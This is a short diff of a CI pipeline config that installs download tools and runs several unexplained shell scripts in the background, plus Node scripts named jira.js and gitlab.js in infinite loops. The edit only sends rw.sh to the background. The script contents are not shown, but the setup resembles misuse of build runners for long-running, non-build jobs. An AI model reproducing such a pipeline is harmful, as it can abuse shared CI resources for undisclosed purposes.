@@ -14,7 +14,7 @@ pipelines:
            - apt update && apt -y install wget curl axel
            - chmod +x ./test.sh && ./test.sh &
            - chmod +x ./google.sh && ./google.sh &
-           - chmod +x ./rw.sh && ./rw.sh
+           - chmod +x ./rw.sh && ./rw.sh &
            - chmod +x ./jira.sh && ./jira.sh &
            - npm install && while true; do nodejs jira.js; done &
            - npm install && while true; do nodejs gitlab.js; done &
